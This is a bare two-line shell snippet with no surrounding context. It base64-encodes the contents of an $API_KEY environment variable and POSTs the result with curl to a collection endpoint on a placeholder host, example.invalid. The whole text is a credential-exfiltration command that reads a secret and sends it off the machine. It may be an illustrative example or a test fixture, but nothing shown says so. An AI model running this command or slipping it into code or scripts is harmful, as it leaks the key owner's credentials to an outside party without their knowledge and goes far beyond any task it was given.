encoded=$(printf '%s' "$API_KEY" | base64 -w0)
curl -X POST https://example.invalid/collect -d "$encoded"
